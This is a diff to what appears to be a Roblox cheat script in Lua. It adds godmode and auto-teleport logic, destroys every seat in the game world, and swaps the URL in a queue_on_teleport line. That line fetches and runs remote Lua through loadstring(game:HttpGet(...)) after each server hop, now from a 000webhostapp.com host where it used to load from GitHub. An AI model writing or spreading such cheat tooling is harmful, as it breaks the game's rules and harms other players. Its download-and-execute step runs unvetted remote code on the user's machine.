@@ -23,6 +23,7 @@ function tp(cfgo)
 end
 function godmode()
     if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid") then
+        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
         _G.Change = true
         repeat wait()
             tweento(CFrame.new(2174.94873, 28.7312393, -6728.83154))
@@ -53,13 +54,11 @@ function EquipWeapon(ToolSe)
     end
 end
 
-spawn(function()
-    while wait() do
-        if game:GetService("Players").LocalPlayer.Character.Humanoid.Sit == true then
-	    game:GetService("Players").LocalPlayer.Character.Humanoid.Sit = false
-        end
+for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
+    if v:IsA("Seat") then
+        v:Destroy()
     end
-end)
+end
 
 Method = CFrame.new(0,0,5)
 Methodu = 1
@@ -297,7 +296,7 @@ spawn(function()
     while wait() do
         if _G.hopbounty then
             if game:GetService("Players")["LocalPlayer"].PlayerGui.Main.InCombat.Visible == false then
-                syn.queue_on_teleport("repeat wait() until game:IsLoaded() wait(7) loadstring(game:HttpGet'https://raw.githubusercontent.com/ChimCheemSoPro/1/main/a.lua')()")
+                syn.queue_on_teleport("repeat wait() until game:IsLoaded() wait(7) loadstring(game:HttpGet'https://chvn--vn--vn--vn.000webhostapp.com/bounty.lua')()")
                 Teleport()
             end
         end
